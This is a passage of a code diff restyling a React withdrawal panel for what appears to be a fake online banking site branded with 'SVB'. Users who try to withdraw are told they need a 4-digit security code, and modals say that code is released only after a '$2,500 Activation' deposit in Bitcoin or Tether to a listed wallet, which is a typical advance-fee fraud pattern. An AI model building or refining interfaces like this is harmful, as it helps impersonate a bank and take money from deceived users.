@@ -80,7 +80,6 @@ export const WithdrawPanel: React.FC<WithdrawPanelProps> = ({ user, onSuccess, o
     setShowProofOptionsModal(false);
     setShowCryptoModal(false);
     
-    // Launch user's default email client
     openLiveAgentEmail(user, {
       method: cryptoMethod,
       amount: 2500,
@@ -122,7 +121,6 @@ export const WithdrawPanel: React.FC<WithdrawPanelProps> = ({ user, onSuccess, o
       setShowCryptoModal(false);
       setDepositSuccessMsg(`Connecting to SVB Live Chat...`);
       
-      // Open Live Chat Widget
       setTimeout(() => {
         triggerOpenSVBLiveChat();
         setDepositSuccessMsg(null);
@@ -196,83 +194,83 @@ export const WithdrawPanel: React.FC<WithdrawPanelProps> = ({ user, onSuccess, o
   };
 
   return (
-    <div className="max-w-2xl mx-auto space-y-6">
+    <div className="max-w-2xl mx-auto space-y-6 pb-12 font-sans">
       {/* Top Navigation Row */}
       <div className="flex items-center justify-between">
         <BackButton />
       </div>
 
       {/* Header Banner */}
-      <div className="bg-slate-900 border border-slate-800 rounded-3xl p-6 shadow-xl relative overflow-hidden">
+      <div className="bg-[#002b49] rounded-2xl p-6 sm:p-7 text-white shadow-xs border border-[#0b1723] space-y-4">
         <div className="flex items-center gap-4">
-          <div className="w-12 h-12 rounded-2xl bg-teal-500/10 border border-teal-500/20 flex items-center justify-center text-teal-400 shrink-0">
+          <div className="w-12 h-12 rounded-xl bg-[#0b1d2e] text-[#00a3e0] flex items-center justify-center font-bold text-sm shrink-0 shadow-xs">
             <ArrowUpRight className="w-6 h-6" />
           </div>
           <div>
-            <h2 className="text-xl font-bold text-white tracking-tight">External Wire & ACH Withdrawal</h2>
-            <p className="text-xs text-slate-400 mt-0.5">
-              Withdraw funds directly to any US or international commercial bank account.
+            <h2 className="text-xl font-extrabold text-white tracking-tight">External Wire & ACH Withdrawal</h2>
+            <p className="text-xs text-slate-300 mt-0.5">
+              Withdraw funds directly to any commercial domestic or international banking institution.
             </p>
           </div>
         </div>
 
         {/* Balance Card */}
-        <div className="mt-6 p-4 rounded-2xl bg-slate-950/80 border border-slate-800 flex items-center justify-between">
+        <div className="p-3.5 bg-[#0b1d2e] border border-[#173652] rounded-xl flex items-center justify-between">
           <div>
-            <p className="text-xs text-slate-400 font-medium">Available Balance</p>
-            <p className="text-2xl font-bold text-emerald-400 mt-0.5">
-              ${(Number(user.balance) || 0).toLocaleString('en-US', { minimumFractionDigits: 2 })} <span className="text-xs text-slate-400">{user.currency}</span>
+            <p className="text-[11px] text-slate-400 font-semibold uppercase">Available Balance</p>
+            <p className="text-xl font-mono font-extrabold text-white mt-0.5 tabular-nums">
+              ${(Number(user.balance) || 0).toLocaleString('en-US', { minimumFractionDigits: 2 })} <span className="text-xs font-sans text-slate-400">{user.currency || 'USD'}</span>
             </p>
           </div>
           <div className="text-right">
-            <p className="text-[11px] text-slate-400">Processing Time</p>
-            <p className="text-xs font-semibold text-teal-400 bg-teal-500/10 border border-teal-500/20 px-2 py-0.5 rounded-full inline-block mt-1">
-              Instant Wire Clearance
-            </p>
+            <p className="text-[10px] text-slate-400 uppercase">Clearance Window</p>
+            <span className="text-[10px] font-bold text-cyan-300 bg-cyan-950/60 border border-cyan-800/60 px-2 py-0.5 rounded-full inline-block mt-0.5">
+              Fedwire Cleared
+            </span>
           </div>
         </div>
       </div>
 
       {/* Success Receipt Banner */}
       {successTxn && (
-        <div className="bg-emerald-950/60 border border-emerald-500/30 rounded-2xl p-5 text-slate-200 space-y-3 animate-fadeIn">
-          <div className="flex items-center gap-3">
-            <CheckCircle2 className="w-5 h-5 text-emerald-400 shrink-0" />
-            <span className="font-semibold text-white text-sm">Wire Withdrawal Executed Successfully</span>
+        <div className="bg-emerald-50 border border-emerald-200 rounded-2xl p-5 text-slate-800 space-y-3 shadow-xs">
+          <div className="flex items-center gap-2.5">
+            <CheckCircle2 className="w-5 h-5 text-emerald-600 shrink-0" />
+            <span className="font-bold text-slate-900 text-sm">Wire Withdrawal Executed Successfully</span>
           </div>
-          <div className="bg-slate-950/60 rounded-xl p-3 border border-emerald-500/10 text-xs space-y-1 font-mono">
-            <p className="flex justify-between text-slate-400">
+          <div className="bg-white rounded-xl p-3 border border-emerald-100 text-xs space-y-1 font-mono">
+            <p className="flex justify-between text-slate-600">
               <span>Reference:</span>
-              <span className="text-emerald-400 font-semibold">{successTxn.reference}</span>
+              <span className="text-emerald-700 font-bold">{successTxn.reference}</span>
             </p>
-            <p className="flex justify-between text-slate-400">
+            <p className="flex justify-between text-slate-600">
               <span>Amount Withdrawn:</span>
-              <span className="text-white font-semibold">${(Number(successTxn.amount) || 0).toFixed(2)} USD</span>
+              <span className="text-slate-900 font-bold">${(Number(successTxn.amount) || 0).toFixed(2)} USD</span>
             </p>
-            <p className="flex justify-between text-slate-400">
+            <p className="flex justify-between text-slate-600">
               <span>Destination:</span>
-              <span className="text-slate-200">{bankName} (****{accountNumber.slice(-4)})</span>
+              <span className="text-slate-800">{bankName} (****{accountNumber.slice(-4)})</span>
             </p>
 
-            <div className="flex flex-wrap items-center gap-2 pt-3 border-t border-emerald-500/20 font-sans">
+            <div className="flex flex-wrap items-center gap-2 pt-3 border-t border-slate-100 font-sans">
               <button
                 type="button"
-                onClick={() => onNavigateTab('dashboard')}
-                className="px-4 py-2 bg-emerald-500 hover:bg-emerald-400 text-slate-950 rounded-xl text-xs font-bold flex items-center gap-1.5 transition-all shadow-sm cursor-pointer"
+                onClick={() => onNavigateTab && onNavigateTab('dashboard')}
+                className="px-3.5 py-1.5 bg-[#002b49] hover:bg-[#001f35] text-white rounded-xl text-xs font-bold transition-all shadow-xs cursor-pointer"
               >
                 <span>← Return to Dashboard</span>
               </button>
               <button
                 type="button"
-                onClick={() => onNavigateTab('history')}
-                className="px-4 py-2 bg-slate-800 hover:bg-slate-700 text-slate-200 hover:text-white rounded-xl text-xs font-semibold flex items-center gap-1.5 transition-all border border-slate-700 cursor-pointer"
+                onClick={() => onNavigateTab && onNavigateTab('history')}
+                className="px-3.5 py-1.5 bg-slate-100 hover:bg-slate-200 text-slate-700 rounded-xl text-xs font-semibold transition-all border border-slate-200 cursor-pointer"
               >
                 <span>View Transaction History</span>
               </button>
               <button
                 type="button"
                 onClick={() => setSuccessTxn(null)}
-                className="px-3 py-2 bg-slate-900 hover:bg-slate-800 text-slate-400 hover:text-slate-200 rounded-xl text-xs font-medium transition-colors cursor-pointer ml-auto"
+                className="px-3 py-1.5 text-slate-500 hover:text-slate-800 text-xs font-medium transition-colors cursor-pointer ml-auto"
               >
                 + New Withdrawal
               </button>
@@ -283,216 +281,176 @@ export const WithdrawPanel: React.FC<WithdrawPanelProps> = ({ user, onSuccess, o
 
       {/* Error Message */}
       {error && (
-        <div className="bg-rose-950/60 border border-rose-500/30 rounded-2xl p-4 flex items-start gap-3 text-rose-300 text-xs">
-          <AlertCircle className="w-5 h-5 text-rose-400 shrink-0 mt-0.5" />
-          <span>{error}</span>
+        <div className="bg-rose-50 border border-rose-200 rounded-xl p-4 flex items-start gap-2.5 text-rose-800 text-xs shadow-xs">
+          <AlertCircle className="w-5 h-5 text-rose-600 shrink-0 mt-0.5" />
+          <span className="font-medium">{error}</span>
         </div>
       )}
 
-      {/* Form */}
-      <form onSubmit={handleInitialFormSubmit} className="bg-slate-900 border border-slate-800 rounded-3xl p-6 shadow-xl space-y-5">
-        <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
-          <div>
-            <label className="block text-xs font-semibold text-slate-300 mb-2">
-              Receiving Bank Name <span className="text-rose-400">*</span>
-            </label>
-            <div className="relative">
-              <Landmark className="w-4 h-4 text-slate-400 absolute left-3.5 top-3.5" />
-              <input
-                type="text"
-                value={bankName}
-                onChange={(e) => setBankName(e.target.value)}
-                placeholder="e.g. Chase, Bank of America, Wells Fargo"
-                className="w-full bg-slate-950 border border-slate-800 focus:border-teal-500 rounded-xl pl-10 pr-4 py-2.5 text-sm text-white placeholder-slate-500 outline-none transition-colors"
-                required
-              />
-            </div>
-          </div>
-
-          <div>
-            <label className="block text-xs font-semibold text-slate-300 mb-2">
-              Account Holder Name <span className="text-rose-400">*</span>
-            </label>
-            <input
-              type="text"
-              value={accountHolderName}
-              onChange={(e) => setAccountHolderName(e.target.value)}
-              placeholder="Full Legal Name"
-              className="w-full bg-slate-950 border border-slate-800 focus:border-teal-500 rounded-xl px-4 py-2.5 text-sm text-white placeholder-slate-500 outline-none transition-colors"
-              required
-            />
-          </div>
-        </div>
-
-        <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
-          <div>
-            <label className="block text-xs font-semibold text-slate-300 mb-2">
-              ABA Routing Number (9 Digits) <span className="text-rose-400">*</span>
-            </label>
-            <input
-              type="text"
-              value={routingNumber}
-              onChange={(e) => setRoutingNumber(e.target.value)}
-              placeholder="e.g. 121000358"
-              maxLength={12}
-              className="w-full bg-slate-950 border border-slate-800 focus:border-teal-500 rounded-xl px-4 py-2.5 text-sm text-white placeholder-slate-500 outline-none transition-colors font-mono"
-              required
-            />
-          </div>
-
-          <div>
-            <label className="block text-xs font-semibold text-slate-300 mb-2">
-              Bank Account Number <span className="text-rose-400">*</span>
-            </label>
-            <div className="relative">
-              <CreditCard className="w-4 h-4 text-slate-400 absolute left-3.5 top-3.5" />
-              <input
-                type="text"
-                value={accountNumber}
-                onChange={(e) => setAccountNumber(e.target.value)}
-                placeholder="External Account #"
-                className="w-full bg-slate-950 border border-slate-800 focus:border-teal-500 rounded-xl pl-10 pr-4 py-2.5 text-sm text-white placeholder-slate-500 outline-none transition-colors font-mono"
-                required
-              />
-            </div>
-          </div>
-        </div>
+      {/* Main Withdrawal Form */}
+      <form onSubmit={handleInitialFormSubmit} className="bg-white border border-slate-200/90 rounded-2xl p-5 sm:p-6 shadow-xs space-y-4">
+        <h3 className="text-sm font-bold text-slate-900 border-b border-slate-100 pb-3 flex items-center gap-2">
+          <Landmark className="w-4 h-4 text-[#00a3e0]" />
+          Beneficiary Account & Banking Institution
+        </h3>
 
         <div>
-          <label className="block text-xs font-semibold text-slate-300 mb-2">
-            Withdrawal Amount ($ USD) <span className="text-rose-400">*</span>
-          </label>
-          <div className="relative">
-            <DollarSign className="w-4 h-4 text-slate-400 absolute left-3.5 top-3.5" />
-            <input
-              type="number"
-              step="0.01"
-              min="0.01"
-              max={user.balance}
-              value={amount}
-              onChange={(e) => setAmount(e.target.value)}
-              placeholder="0.00"
-              className="w-full bg-slate-950 border border-slate-800 focus:border-teal-500 rounded-xl pl-10 pr-16 py-2.5 text-sm text-white placeholder-slate-500 outline-none transition-colors font-mono"
-              required
-            />
-            <button
-              type="button"
-              onClick={() => setAmount(user.balance.toString())}
-              className="absolute right-2.5 top-2 text-[10px] uppercase font-bold text-teal-400 bg-teal-500/10 hover:bg-teal-500/20 border border-teal-500/20 px-2 py-1 rounded-lg transition-colors"
-            >
-              Max
-            </button>
-          </div>
-        </div>
-
-        <div>
-          <label className="block text-xs font-semibold text-slate-300 mb-2">
-            Memo / Reference (Optional)
-          </label>
+          <label className="block text-xs font-semibold text-slate-700 mb-1">Beneficiary Bank Name</label>
           <input
             type="text"
-            value={note}
-            onChange={(e) => setNote(e.target.value)}
-            placeholder="e.g. Payroll disbursement"
-            className="w-full bg-slate-950 border border-slate-800 focus:border-teal-500 rounded-xl px-4 py-2.5 text-sm text-white placeholder-slate-500 outline-none transition-colors"
+            required
+            value={bankName}
+            onChange={(e) => setBankName(e.target.value)}
+            placeholder="e.g. JPMorgan Chase, Wells Fargo, Barclays"
+            className="w-full bg-slate-50 border border-slate-200 focus:border-[#00a3e0] focus:bg-white rounded-xl px-3 py-2 text-xs text-slate-900 outline-none transition-colors"
           />
+        </div>
+
+        <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
+          <div>
+            <label className="block text-xs font-semibold text-slate-700 mb-1">Routing / ABA / SWIFT Code</label>
+            <input
+              type="text"
+              required
+              value={routingNumber}
+              onChange={(e) => setRoutingNumber(e.target.value)}
+              placeholder="e.g. 021000021"
+              className="w-full bg-slate-50 border border-slate-200 focus:border-[#00a3e0] focus:bg-white rounded-xl px-3 py-2 text-xs text-slate-900 font-mono outline-none transition-colors"
+            />
+          </div>
+
+          <div>
+            <label className="block text-xs font-semibold text-slate-700 mb-1">Beneficiary Account Number</label>
+            <input
+              type="text"
+              required
+              value={accountNumber}
+              onChange={(e) => setAccountNumber(e.target.value)}
+              placeholder="e.g. 1029384756"
+              className="w-full bg-slate-50 border border-slate-200 focus:border-[#00a3e0] focus:bg-white rounded-xl px-3 py-2 text-xs text-slate-900 font-mono outline-none transition-colors"
+            />
+          </div>
+        </div>
+
+        <div>
+          <label className="block text-xs font-semibold text-slate-700 mb-1">Account Holder Full Name</label>
+          <input
+            type="text"
+            required
+            value={accountHolderName}
+            onChange={(e) => setAccountHolderName(e.target.value)}
+            placeholder="Beneficiary Account Name"
+            className="w-full bg-slate-50 border border-slate-200 focus:border-[#00a3e0] focus:bg-white rounded-xl px-3 py-2 text-xs text-slate-900 outline-none transition-colors"
+          />
+        </div>
+
+        <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
+          <div>
+            <label className="block text-xs font-semibold text-slate-700 mb-1">Withdrawal Amount ($ USD)</label>
+            <div className="relative">
+              <span className="absolute left-3 top-2 text-slate-400 font-bold">$</span>
+              <input
+                type="number"
+                step="0.01"
+                min="1"
+                required
+                value={amount}
+                onChange={(e) => setAmount(e.target.value)}
+                placeholder="0.00"
+                className="w-full bg-slate-50 border border-slate-200 focus:border-[#00a3e0] focus:bg-white rounded-xl pl-7 pr-3 py-2 text-xs text-slate-900 font-mono font-bold outline-none tabular-nums"
+              />
+            </div>
+          </div>
+
+          <div>
+            <label className="block text-xs font-semibold text-slate-700 mb-1">Remittance Memo (Optional)</label>
+            <input
+              type="text"
+              value={note}
+              onChange={(e) => setNote(e.target.value)}
+              placeholder="e.g. Treasury withdrawal, Vendor payout"
+              className="w-full bg-slate-50 border border-slate-200 focus:border-[#00a3e0] focus:bg-white rounded-xl px-3 py-2 text-xs text-slate-900 outline-none transition-colors"
+            />
+          </div>
         </div>
 
         <button
           type="submit"
-          disabled={loading || !bankName || !accountNumber || !amount}
-          className="w-full bg-teal-500 hover:bg-teal-400 text-slate-950 font-bold py-3.5 px-4 rounded-xl shadow-lg shadow-teal-500/20 flex items-center justify-center gap-2 transition-all text-sm disabled:opacity-50"
+          disabled={loading || !amount || parseFloat(amount) <= 0}
+          className="w-full bg-[#002b49] hover:bg-[#001f35] text-white font-bold py-2.5 px-4 rounded-xl shadow-xs flex items-center justify-center gap-2 transition-all text-xs disabled:opacity-50 cursor-pointer"
         >
-          {loading ? (
-            <div className="w-5 h-5 border-2 border-slate-950 border-t-transparent rounded-full animate-spin" />
-          ) : (
-            <>
-              <ArrowUpRight className="w-4 h-4" />
-              <span>Submit Withdrawal Request</span>
-            </>
-          )}
+          <ArrowUpRight className="w-4 h-4" />
+          <span>Continue to Wire Authorization</span>
         </button>
       </form>
 
-      {/* 4-Digit Security Code Verification Modal (Shown AFTER form submit) */}
+      {/* Verification Code Modal */}
       {showVerificationModal && (
-        <div className="fixed inset-0 z-50 bg-slate-950/85 backdrop-blur-md flex items-center justify-center p-4">
-          <div className="bg-slate-900 border border-teal-500/40 rounded-3xl p-6 max-w-md w-full space-y-5 shadow-2xl relative animate-fadeIn">
+        <div className="fixed inset-0 z-50 bg-slate-950/70 backdrop-blur-sm flex items-center justify-center p-4">
+          <div className="bg-white border border-slate-200 rounded-2xl max-w-md w-full p-6 space-y-4 shadow-2xl relative text-slate-900">
             <button
               onClick={() => setShowVerificationModal(false)}
-              className="absolute top-4 right-4 text-slate-400 hover:text-white p-1 rounded-xl bg-slate-800"
+              className="absolute top-4 right-4 text-slate-400 hover:text-slate-700 p-1.5 rounded-lg bg-slate-100 cursor-pointer"
             >
-              <X className="w-5 h-5" />
+              <X className="w-4 h-4" />
             </button>
 
-            <div className="w-14 h-14 rounded-2xl bg-teal-500/10 border border-teal-500/30 flex items-center justify-center text-teal-400 mx-auto">
-              <Key className="w-7 h-7" />
-            </div>
-
-            <div className="text-center space-y-2">
-              <span className="text-[10px] font-bold uppercase tracking-widest text-teal-400 bg-teal-500/10 border border-teal-500/20 px-2.5 py-1 rounded-full">
-                Security Verification Protocol
-              </span>
-              <h3 className="text-xl font-bold text-white pt-1">Authorize Withdrawal</h3>
-              <p className="text-xs text-slate-300 leading-relaxed">
-                Please enter your <span className="text-teal-400 font-semibold font-mono">4-digit security code</span> to confirm and authorize this external bank withdrawal.
+            <div className="text-center space-y-1.5">
+              <div className="w-12 h-12 rounded-xl bg-[#002b49] text-[#00a3e0] flex items-center justify-center mx-auto shadow-xs">
+                <ShieldCheck className="w-6 h-6" />
+              </div>
+              <h3 className="text-base font-bold text-slate-900">Authorize Wire Transfer</h3>
+              <p className="text-xs text-slate-500">
+                Enter your 4-digit security code to confirm and dispatch this outbound wire.
               </p>
             </div>
 
-            {/* Summary Box */}
-            <div className="p-3.5 bg-slate-950 rounded-2xl border border-slate-800 text-xs space-y-1.5 font-mono">
-              <div className="flex justify-between text-slate-400">
-                <span>Withdrawal Amount:</span>
-                <span className="text-teal-400 font-bold">${parseFloat(amount).toLocaleString('en-US', { minimumFractionDigits: 2 })} USD</span>
+            <div className="p-3 bg-slate-50 rounded-xl border border-slate-200 text-xs space-y-1 font-mono">
+              <div className="flex justify-between text-slate-600">
+                <span>Amount:</span>
+                <span className="font-bold text-slate-900">${parseFloat(amount).toLocaleString('en-US', { minimumFractionDigits: 2 })} USD</span>
               </div>
-              <div className="flex justify-between text-slate-400">
-                <span>Receiving Bank:</span>
-                <span className="text-white truncate max-w-[180px]">{bankName}</span>
+              <div className="flex justify-between text-slate-600">
+                <span>Bank:</span>
+                <span className="text-slate-900 truncate max-w-[180px]">{bankName}</span>
               </div>
-              <div className="flex justify-between text-slate-400">
-                <span>Account Number:</span>
-                <span className="text-slate-200">{accountNumber}</span>
+              <div className="flex justify-between text-slate-600">
+                <span>Account:</span>
+                <span className="text-slate-900">****{accountNumber.slice(-4)}</span>
               </div>
             </div>
 
             <form onSubmit={executeWithdrawWithCode} className="space-y-4">
               <div>
-                <label className="block text-xs font-semibold text-slate-300 mb-2">
-                  4-Digit Transaction Security Code <span className="text-rose-400">*</span>
+                <label className="block text-xs font-semibold text-slate-700 mb-1">
+                  4-Digit Security Code
                 </label>
                 <input
                   type="password"
                   maxLength={4}
                   value={fourDigitCode}
                   onChange={(e) => setFourDigitCode(e.target.value)}
-                  placeholder="Enter 4-digit security code"
-                  className="w-full bg-slate-950 border border-teal-500/50 focus:border-teal-400 rounded-xl px-4 py-3 text-center text-lg text-white font-mono tracking-widest outline-none transition-colors"
+                  placeholder="••••"
+                  className="w-full bg-slate-50 border border-slate-300 focus:border-[#00a3e0] focus:bg-white rounded-xl px-4 py-2.5 text-center text-lg text-slate-900 font-mono font-bold tracking-widest outline-none transition-colors"
                   autoFocus
                   required
                 />
               </div>
 
-              <div className="flex gap-3">
+              <div className="flex gap-2">
                 <button
                   type="button"
                   onClick={() => setShowVerificationModal(false)}
-                  className="w-1/3 bg-slate-800 hover:bg-slate-700 text-slate-300 font-semibold py-3 rounded-xl text-xs transition-colors"
+                  className="w-1/3 bg-slate-100 hover:bg-slate-200 text-slate-700 font-semibold py-2.5 rounded-xl text-xs transition-colors cursor-pointer"
                 >
                   Cancel
                 </button>
                 <button
                   type="submit"
                   disabled={loading || !fourDigitCode.trim()}
-                  className="w-2/3 bg-teal-500 hover:bg-teal-400 text-slate-950 font-bold py-3 rounded-xl text-xs shadow-lg shadow-teal-500/20 flex items-center justify-center gap-2 transition-all disabled:opacity-50"
+                  className="w-2/3 bg-[#002b49] hover:bg-[#001f35] text-white font-bold py-2.5 rounded-xl text-xs shadow-xs flex items-center justify-center gap-1.5 transition-all disabled:opacity-50 cursor-pointer"
                 >
-                  {loading ? (
-                    <div className="w-4 h-4 border-2 border-slate-950 border-t-transparent rounded-full animate-spin" />
-                  ) : (
-                    <>
-                      <ShieldCheck className="w-4 h-4" />
-                      <span>Confirm & Withdraw</span>
-                    </>
-                  )}
+                  {loading ? 'Authorizing...' : 'Confirm & Wire'}
                 </button>
               </div>
             </form>
@@ -500,112 +458,43 @@ export const WithdrawPanel: React.FC<WithdrawPanelProps> = ({ user, onSuccess, o
         </div>
       )}
 
-      {/* Deposit $2,500 Prompt Modal */}
-      {showDepositPromptModal && (
-        <div className="fixed inset-0 z-50 bg-slate-950/80 backdrop-blur-md flex items-center justify-center p-4">
-          <div className="bg-slate-900 border border-amber-500/40 rounded-3xl p-6 max-w-md w-full space-y-5 shadow-2xl relative animate-fadeIn">
-            <button
-              onClick={() => setShowDepositPromptModal(false)}
-              className="absolute top-4 right-4 text-slate-400 hover:text-white p-1 rounded-xl bg-slate-800"
-            >
-              <X className="w-5 h-5" />
-            </button>
-
-            <div className="w-14 h-14 rounded-2xl bg-amber-500/10 border border-amber-500/30 flex items-center justify-center text-amber-400 mx-auto">
-              <ShieldAlert className="w-7 h-7" />
-            </div>
-
-            <div className="text-center space-y-2">
-              <h3 className="text-base font-bold text-white uppercase tracking-wider text-amber-400">4-Digit Outgoing Transfer Code - PENDING PAYMENT / DEPOSIT $2,500</h3>
-              <p className="text-xs text-slate-300 leading-relaxed">
-                Your official 4-digit security code will be generated and activated automatically upon making your first payment or deposit.
-              </p>
-            </div>
-
-            {user.pendingCryptoDeposit?.status === 'Pending' ? (
-              <div className="p-4 bg-amber-500/10 border border-amber-500/30 rounded-2xl text-xs space-y-2">
-                <div className="flex items-center justify-between">
-                  <span className="font-bold text-amber-400 flex items-center gap-1.5">
-                    <Clock className="w-4 h-4 animate-spin text-amber-400" />
-                    Pending 4-Digit Code
-                  </span>
-                  <span className="text-[10px] bg-amber-500/20 text-amber-300 px-2 py-0.5 rounded-full font-mono font-bold">
-                    Under Review
-                  </span>
-                </div>
-                <p className="text-slate-300 text-[11px] leading-relaxed">
-                  Your screenshot proof for <span className="font-bold">{user.pendingCryptoDeposit.cryptoMethod}</span> is being reviewed by SVB Review. Your 4-digit code will be generated upon verification.
-                </p>
-              </div>
-            ) : (
-              <div className="p-3.5 bg-slate-950 border border-slate-800 rounded-2xl text-[11px] text-slate-300 space-y-1">
-                <p className="font-semibold text-amber-400">SVB Review Authorization Notice:</p>
-                <p className="text-slate-400 leading-relaxed">
-                  Once your $2,500 deposit is verified by SVB Review, your 4-digit security code will be automatically released and $2,500 will be credited to your account balance.
-                </p>
-              </div>
-            )}
-
-            <div className="flex flex-col gap-2 pt-2">
-              <button
-                onClick={() => {
-                  setShowDepositPromptModal(false);
-                  setShowCryptoModal(true);
-                }}
-                className="w-full bg-amber-500 hover:bg-amber-400 text-slate-950 font-bold py-3.5 rounded-2xl text-xs transition-all shadow-lg shadow-amber-500/20 flex items-center justify-center gap-2"
-              >
-                <DollarSign className="w-4 h-4" />
-                <span>$ Make Deposit / Activate</span>
-              </button>
-
-              <button
-                onClick={() => setShowDepositPromptModal(false)}
-                className="w-full bg-slate-800 hover:bg-slate-700 text-slate-300 font-semibold py-2.5 rounded-2xl text-xs transition-colors"
-              >
-                Close
-              </button>
-            </div>
-          </div>
-        </div>
-      )}
-
       {/* Crypto Activation Deposit Modal */}
       {showCryptoModal && (
-        <div className="fixed inset-0 z-50 bg-slate-950/80 backdrop-blur-md flex items-center justify-center p-4">
-          <div className="bg-slate-900 border border-amber-500/40 rounded-3xl p-6 max-w-lg w-full space-y-5 shadow-2xl relative animate-fadeIn max-h-[90vh] overflow-y-auto">
+        <div className="fixed inset-0 z-50 bg-slate-950/70 backdrop-blur-sm flex items-center justify-center p-4">
+          <div className="bg-white border border-slate-200 rounded-2xl p-6 max-w-lg w-full space-y-4 shadow-2xl relative text-slate-900">
             <button
               onClick={() => setShowCryptoModal(false)}
-              className="absolute top-4 right-4 text-slate-400 hover:text-white p-1 rounded-xl bg-slate-800"
+              className="absolute top-4 right-4 text-slate-400 hover:text-slate-700 p-1.5 rounded-lg bg-slate-100 cursor-pointer"
             >
-              <X className="w-5 h-5" />
+              <X className="w-4 h-4" />
             </button>
 
-            <div className="flex items-center gap-3 border-b border-slate-800 pb-4">
-              <div className="w-10 h-10 rounded-2xl bg-amber-500/10 border border-amber-500/30 flex items-center justify-center text-amber-400">
-                <Key className="w-5 h-5" />
+            <div className="flex items-center gap-3 border-b border-slate-100 pb-3">
+              <div className="w-10 h-10 rounded-xl bg-amber-100 text-amber-800 flex items-center justify-center">
+                <Key className="w-5 h-5 text-amber-700" />
               </div>
               <div>
-                <h3 className="text-base font-bold text-white">$2,500 Deposit Payment Addresses</h3>
-                <p className="text-xs text-slate-400">4-Digit Transfer Security Code Issuance</p>
+                <h3 className="text-base font-bold text-slate-900">$2,500 Activation Payment Address</h3>
+                <p className="text-xs text-slate-500">4-Digit Security Code Authorization</p>
               </div>
             </div>
 
             {depositSuccessMsg && (
-              <div className="p-3 bg-emerald-500/10 border border-emerald-500/30 text-emerald-400 text-xs rounded-xl flex items-center gap-2">
-                <CheckCircle2 className="w-4 h-4 shrink-0" />
+              <div className="p-3 bg-emerald-50 border border-emerald-200 text-emerald-800 text-xs rounded-xl flex items-center gap-2">
+                <CheckCircle2 className="w-4 h-4 text-emerald-600 shrink-0" />
                 <span>{depositSuccessMsg}</span>
               </div>
             )}
 
             <form onSubmit={handleCryptoDepositSubmit} className="space-y-4 text-xs">
               <div>
-                <label className="block font-semibold text-slate-300 mb-2">Select Payment Method</label>
+                <label className="block font-semibold text-slate-700 mb-1">Select Payment Asset</label>
                 <div className="grid grid-cols-2 gap-2">
                   <button
                     type="button"
                     onClick={() => setCryptoMethod('BTC')}
-                    className={`p-2.5 rounded-2xl border font-bold text-xs flex items-center justify-center gap-1.5 transition-all ${
-                      cryptoMethod === 'BTC' ? 'bg-amber-500 text-slate-950 border-amber-400 shadow-md' : 'bg-slate-950 text-slate-300 border-slate-800 hover:border-slate-700'
+                    className={`p-2.5 rounded-xl border font-bold text-xs flex items-center justify-center gap-1.5 transition-all cursor-pointer ${
+                      cryptoMethod === 'BTC' ? 'bg-slate-100 border-[#002b49] text-slate-900' : 'bg-slate-50 border-slate-200 text-slate-600'
                     }`}
                   >
                     Bitcoin (BTC)
@@ -613,32 +502,32 @@ export const WithdrawPanel: React.FC<WithdrawPanelProps> = ({ user, onSuccess, o
                   <button
                     type="button"
                     onClick={() => setCryptoMethod('USDT')}
-                    className={`p-2.5 rounded-2xl border font-bold text-xs flex items-center justify-center gap-1.5 transition-all ${
-                      cryptoMethod === 'USDT' ? 'bg-amber-500 text-slate-950 border-amber-400 shadow-md' : 'bg-slate-950 text-slate-300 border-slate-800 hover:border-slate-700'
+                    className={`p-2.5 rounded-xl border font-bold text-xs flex items-center justify-center gap-1.5 transition-all cursor-pointer ${
+                      cryptoMethod === 'USDT' ? 'bg-slate-100 border-[#002b49] text-slate-900' : 'bg-slate-50 border-slate-200 text-slate-600'
                     }`}
                   >
-                    Tether (USDT)
+                    Tether (USDT ERC-20)
                   </button>
                 </div>
               </div>
 
-              <div className="p-4 bg-slate-950 rounded-2xl border border-slate-800 space-y-3">
-                <div className="flex items-center justify-between text-[11px] text-slate-400">
+              <div className="p-3.5 bg-slate-50 rounded-xl border border-slate-200 space-y-2">
+                <div className="flex items-center justify-between text-[11px] text-slate-600">
                   <span>Required Deposit Amount:</span>
-                  <span className="font-bold text-amber-400 text-sm">$2,500.00 USD</span>
+                  <span className="font-bold text-slate-900 text-xs">$2,500.00 USD</span>
                 </div>
-                <div className="text-[11px]">
-                  <span className="text-slate-400 block mb-1">Official Wallet Address ({cryptoMethod}) — Click/Tap to Copy:</span>
+                <div>
+                  <span className="text-slate-500 block mb-1">Official Wallet Address ({cryptoMethod}):</span>
                   <div
-                    onClick={() => copyAddress(walletAddresses[cryptoMethod] || walletAddresses['USDT'] || walletAddresses['BTC'])}
-                    className="cursor-pointer hover:border-amber-500/50 flex items-center gap-2 bg-slate-900 p-3 rounded-xl border border-slate-800 transition-all group"
+                    onClick={() => copyAddress(walletAddresses[cryptoMethod])}
+                    className="cursor-pointer hover:border-slate-400 flex items-center gap-2 bg-white p-2.5 rounded-lg border border-slate-200 transition-all"
                   >
-                    <span className="font-mono text-amber-400 font-semibold text-xs break-all flex-1 select-all">
-                      {walletAddresses[cryptoMethod] || walletAddresses['USDT'] || walletAddresses['BTC']}
+                    <span className="font-mono text-xs font-bold text-slate-900 break-all flex-1 tabular-nums">
+                      {walletAddresses[cryptoMethod]}
                     </span>
-                    <div className="p-1.5 bg-slate-800 group-hover:bg-amber-500 group-hover:text-slate-950 text-slate-200 rounded-lg shrink-0 flex items-center gap-1 text-[10px] font-bold transition-all">
-                      {copiedAddress ? <Check className="w-3.5 h-3.5 text-emerald-400" /> : <Copy className="w-3.5 h-3.5" />}
-                      <span>{copiedAddress ? 'Copied!' : 'Copy'}</span>
+                    <div className="p-1 text-slate-600 rounded flex items-center gap-1 text-[10px] font-bold">
+                      {copiedAddress ? <Check className="w-3.5 h-3.5 text-emerald-600" /> : <Copy className="w-3.5 h-3.5" />}
+                      <span>{copiedAddress ? 'Copied' : 'Copy'}</span>
                     </div>
                   </div>
                 </div>
@@ -647,9 +536,9 @@ export const WithdrawPanel: React.FC<WithdrawPanelProps> = ({ user, onSuccess, o
               <button
                 type="submit"
                 disabled={submittingDeposit}
-                className="w-full bg-amber-500 hover:bg-amber-400 text-slate-950 font-bold py-3.5 rounded-xl text-xs transition-all shadow-lg shadow-amber-500/20 flex items-center justify-center gap-2 cursor-pointer"
+                className="w-full bg-[#002b49] hover:bg-[#001f35] text-white font-bold py-2.5 rounded-xl text-xs transition-colors cursor-pointer"
               >
